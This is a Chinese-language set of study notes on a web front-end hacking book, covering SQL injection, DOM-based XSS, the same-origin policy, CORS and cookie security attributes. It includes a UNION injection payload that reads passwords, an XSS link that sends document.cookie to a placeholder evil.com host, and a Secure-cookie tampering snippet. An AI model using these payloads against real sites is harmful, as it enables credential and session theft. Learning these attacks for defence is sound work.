# 《Web 前端黑客技术揭秘》笔记

##### [Essay](https://dixinl.github.io/Essay/)

## 一 Web安全的关键点

指令就是要执行的命令，不同指令的解释执行，由对应的环境完成。

###  1.1 数据与指令

#### 1.1.1 SQL 注入攻击

正常的 SQL 语句：

>```sql
>SELECT username,email FROM users WHERE id=1;
>```

预期结果：

![1572232913690](images/1572232913690.png)

SQL 注入攻击：

> ```sql
> 1 UNION SELECT password as username,1 FROM users
> ```

数据库引擎得到的指令：

> ```sql
> SELECT username,email FROM users WHERE id=1 UNION SELECT password as username,1 FROM users;
> ```

得到的结果：

![1572232948460](images/1572232948460.png)

被组成的 SQL 语句是一个 UNION 查询的合法语句。攻击者可以很容易的获取该表中所有用户的密码。

一般情况下，SQL 注入攻击是发生在服务器端的。但还有另外一种可能，HTML5 提供了一个新的客户端存储机制：在客户端，使用 SQLite 数据库保存客户端数据，该机制允许 JavaScript 脚本操作 SQL 语句，从而与客户端本地数据库进行交互。

#### 1.1.2 XSS 跨站脚本攻击

正常的 Javascript 语句：

> ```js
> <script>
>     eval(location.hash.substr(1));
> </script>
> ```

eval()：eval() 函数可计算某个字符串，并执行其中的的 JavaScript 代码。

location.hash：获取本页链接中的 "#" 符号及其后面的内容。

substr：截取字符串中第 start+1 位及其以后总计 length 位的字符。

如果攻击者构造出这样的链接：

> ```http
> https://www.abc.com/index.html#new%20Image().src='http://www.evil.com/getcookies.php?cookie='+escape(document.cookie)
> ```

escape：escape() 函数可对字符串进行编码，这样就可以在所有的计算机上读取该字符串。

当被攻击者点击了这样被伪装的链接时，Cookies 信息会被盗取到黑客网站上，利用该 Cookies 就可以登录被攻击者的账号，并执行越权操作。

### 1.2 浏览器的同源策略

计算机的本地与 Web 是不同的层面，浏览器上可以运行 Internet 域，但限制了直接进行本地域的读写。

同源策略：**不同域**的**客户端脚本**在没明确**授权**的情况下，不能**读写**对方的**资源**。

#### 1.2.2 客户端脚本

客户端脚本主要指 JavaScript、ActionScript（Flash 的脚本语言）和它们都遵循的 ECMAScript 脚本标准。

#### 1.2.3 授权

HTML5 新标准中提到的关于 AJAX 跨域访问的情况。默认情况下不允许跨域访问。只有当目标站点明确返回 HTTP 响应头：

> ```xml
> Access-Control-Allow-Origin: http://www.abc.com
> ```

那么 www.abc.com 站点上的客户端脚本就有权通过 AJAX 技术对目标服务器上的数据进行读写操作。

AJAX 也是黑客进行 Web 客户端攻击常用的途径，因为这样可以在后台进行。

#### 1.2.5 资源

DOM（Document Object Model）文档对象模型，浏览器将 HTML/XML 这样的文档抽象成一个树形结构。树上的每个节点都代表文档中的标签、属性、或内容。这样抽象出来方便了 JS 进行读写操作。Web 客户端的攻击几乎都离不开 DOM 操作。

## 二 前端基础

### 2.2 URL

HTTP Basic 认证格式：

> ```
> http://username:password@www.abc.com/
> ```

URL 编码方式：

- | 编码               | 解码               |
  | ------------------ | ------------------ |
  | escape             | unescape           |
  | encodeURI          | decodeURI          |
  | encodeURIComponent | decodeURIComponent |

不同浏览器中在自动 URL 编码时也存在差异。

### 2.4 松散的 HTML 世界

#### 2.4.2 iframe 内嵌出一个开放世界

很多页面通过 iframe 内嵌网页，比如内嵌广告

若父页和子页同域，父页调用子页的 contentWindow 来操作子页的 DOM 树，而且这可以是双向的。

若父页和子页不同域，则必须遵守同源策略，但子页可以对父页的 location 有写操作，可以让父页重定向，但没有读操作。

### 2.5 跨站之魂——JavaScript

W3C 新标准中，CROS 推进浏览器支持 AJAX 跨域

来源域的 AJAX 向目标域发起请求，浏览器会自动带上 Origin 头

> ```js
> Origin: http://www.abc.com
> ```

如果目标域判断 Origin 值符合自己的预期，则返回

> ```js
> Access-Control-Allow-Origin: http://www.abc.com
> ```

表示同意跨域，若该值为 *，则表示任意域都可以跨域。若浏览器没有接收到该字段，就会报权限错误。

尽管目标域不设置 ACAO，且浏览器报权限错误，但实际上隐私数据已经被目标域获取了。

#### 2.5.4 Cookie 安全

同域内浏览器发出的任何一个请求都会带上 Cookie，无论请求什么。

##### 2.5.4.1 子域——domain

设置 Cookie 时，如果不指定 domain 的值，默认就是本域。

domain 也可以设置为自己的父域，这样就可以在不同的子域共享 Cookie。但是攻击者也可以从其他的子域获取 Cookie。

该值不允许设置为下一级子域或者其他外域。

##### 2.5.4.2 路径——path

如果不指定 path 值，默认就是目标页面的路径。

Js 有权限设置任意 Cookie 到任意路径下，但只有目标路径下的页面才能读取到该 Cookie。

通过跨 iframe 进行 DOM 操作即可获取跨路径的 Cookie。

通过设置 path 不能防止 Cookie 被盗。

##### 2.5.4.3 HttpOnly

设置了 HttpOnly 会使该 Cookie 仅在 HTTP 层面上传输，客户端脚本无法读写该 Cookie，这样能有效的防止 XSS 攻击。

但如果服务端相应的页面有 Cookie 调试信息，就很有可能导致 HttpOnly Cookie泄露。

CVE-2012-0053 漏洞：Apache HTTP Server 2.2.x 版本没有严格控制 HTTP 请求头信息，当 HTTP 请求头信息超过 LimitRequestFieldSize 长度时，服务器返回 400 错误，并在返回信息中将出错的请求头内容输出，攻击者可以通过设置垃圾 Cookie 使请求头长度超过 Apache 的限制长度从而报错并返回所有 Cookie。

HttpOnly 可以有效防止客户端出现问题。但对于服务端响应泄露，需要谨慎对待。

##### 2.5.4.4 Secure

设置了 Secure 标志的 Cookie 仅在 HTTPS 层面上安全传输。如果是在 HTTP 传输，该 Cookie 就不会被传输。

但 Secure Cookie 在客户端脚本来说是可以读写的。可读意味着可被盗，可写意味着可被篡改。

> ```js
> //篡改Secure Cookie，path 与 domain 必须一致，否则会被认为是不同的 Cookie
> document.cookie="test_secure=abc;path=/;secure;"
> ```

##### 2.5.4.5 本地/内存 Cookie

| 区别           | 名称        | 销毁时间                             |
| -------------- | ----------- | ------------------------------------ |
| 没设置过期时间 | 内存 Cookie | 浏览器关闭即从内存中删除             |
| 设置了过期时间 | 本地 Cookie | 以文本形式保存，在超过过期时间后销毁 |

用户体验与风险是矛盾的。

内存 Cookie并不一定安全，攻击者可以给内存 Cookie 加一个过期时间，使其变为一个本地 Cookie。

##### 2.5.4.6 P3P 隐私保护

该字段用于表示是否允许目标网站的 Cookie 被另一个域通过加载目标网站而被设置或发送，但仅 IE 严格执行了该策略。

设置 Cookie：

IE 下默认不允许第三方域设置，除非在 abc 域响应时带上 P3P 字段。这样设置后，目标域的 Cookie 就可以被正常设置了。设置后的 Cookie 在 IE 下会自动带上 P3P 属性（该属性在 Cookie 中是看不到的），一次生效，即使之后没有 P3P 头，也有效。

发送 Cookie：

如果是内存 Cookie，无所谓是否有 P3P 属性，都可以正常发送。

如果是本地 Cookie，则本地 Cookie 必须拥有 P3P 属性，即使目标域响应了 P3P 头也没用。